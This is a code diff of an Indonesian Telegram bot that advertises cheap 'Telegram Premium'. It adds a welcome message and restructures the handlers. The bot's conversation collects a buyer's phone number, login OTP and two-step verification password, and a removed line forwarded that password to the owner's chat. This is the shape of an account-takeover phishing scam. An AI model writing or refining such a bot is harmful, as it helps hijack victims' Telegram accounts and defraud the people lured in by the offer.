@@ -43,9 +43,23 @@ metode_pembayaran = [
 user_data_store = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    teks = "📦 Daftar Produk:\n\n"
+    # Pesan welcome
+    teks = (
+        "👑 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝑺𝒓𝒑𝒂𝑷𝒓𝒆𝒎 👑\n\n"
+        "✨ 𝐓𝐄𝐋𝐄𝐏𝐑𝐄𝐌 𝐌𝐔𝐑𝐀𝐇 & 𝐓𝐄𝐑𝐏𝐄𝐑𝐂𝐀𝐘𝐀 ✨\n\n"
+        "🛒 𝘔𝘢𝘶 𝘣𝘦𝘭𝘪 𝘛𝘌𝘓𝘌𝘗𝘙𝘌𝘔 𝘥𝘦𝘯𝘨𝘢𝘯 𝘩𝘢𝘳𝘨𝘢 𝘣𝘦𝘳𝘴𝘢𝘩𝘢𝘣𝘢𝘵?\n"
+        "✅ 𝙃𝙖𝙧𝙜𝙖 𝙈𝙪𝙧𝙖𝙝\n"
+        "✅ 𝙋𝙧𝙤𝙨𝙚𝙨 𝘾𝙚𝙥𝙖𝙩\n"
+        "✅ 𝙏𝙖𝙣𝙥𝙖 𝙍𝙞𝙗𝙚𝙩\n"
+        "✅ 𝙎𝙪𝙙𝙖𝙝 𝙏𝙚𝙧𝙗𝙪𝙠𝙩𝙞 𝙏𝙧𝙪𝙨𝙩𝙚𝙙\n\n"
+        "📩 𝑶𝒓𝒅𝒆𝒓 𝒔𝒆𝒌𝒂𝒓𝒂𝒏𝒈, 𝒋𝒂𝒏𝒈𝒂𝒏 𝒕𝒖𝒏𝒈𝒈𝒖 𝒃𝒆𝒔𝒐𝒌!\n"
+    )
+
+    # Daftar produk
+    teks += "📦 Daftar Produk:\n\n"
     for p in produk_list:
         teks += f"{p['id']}. {p['nama']} - Rp {p['harga']:,} ✨\n"
+    
     keyboard = [
         [InlineKeyboardButton("🛒 Beli Disini", callback_data="beli")],
         [InlineKeyboardButton("📞 CS", url="t.me/serpagengs"),
@@ -157,36 +171,36 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return INPUT_VERIFIKASI
     else:
         user_data_store[uid]["verifikasi"] = text
-        await update.message.reply_text("Terimakasih Atas pembeliannya. Tunggu proses aktivasi ya kak.\nJika butuh bantuan silahkan hubungi owner.\n@serpagengs")
-        await context.bot.send_message(chat_id=OWNER_ID, text=f"🔒 Verifikasi 2 langkah dari @{update.message.from_user.username or uid}: {text}")
+        await update.message.reply_text("Terimakasih Atas pembeliannya. Tunggu proses aktivasi ya kak.\nJika ada masalah hubungi CS.")
         return ConversationHandler.END
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Dibatalkan.")
-    return ConversationHandler.END
+def main():
+    application = ApplicationBuilder().token(TOKEN).build()
 
-if __name__ == '__main__':
-    app = ApplicationBuilder().token(TOKEN).build()
+    # Handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.PHOTO, handle_media))
+    application.add_handler(CallbackQueryHandler(handle_owner_response, pattern=r"owner_.+"))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
+    # Conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
             PILIH_BULAN: [CallbackQueryHandler(button_handler)],
             KONFIRMASI: [CallbackQueryHandler(button_handler)],
             METODE_BAYAR: [CallbackQueryHandler(button_handler)],
-            KIRIM_BUKTI: [
-                CallbackQueryHandler(button_handler),
-                MessageHandler(filters.PHOTO, handle_media)
-            ],
+            KIRIM_BUKTI: [MessageHandler(filters.PHOTO, handle_media)],
             INPUT_NOHP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
             INPUT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
-            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
+            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)]
         },
-        fallbacks=[CommandHandler("cancel", cancel)]
+        fallbacks=[CommandHandler("start", start)],
     )
+    application.add_handler(conv_handler)
 
-    app.add_handler(conv_handler)
-    app.add_handler(CallbackQueryHandler(handle_owner_response, pattern="^owner_.*|^otp_.*|^verif_.*"))
+    application.run_polling()
 
-    print("Bot is running...")
-    app.run_polling()
+if __name__ == "__main__":
+    main()
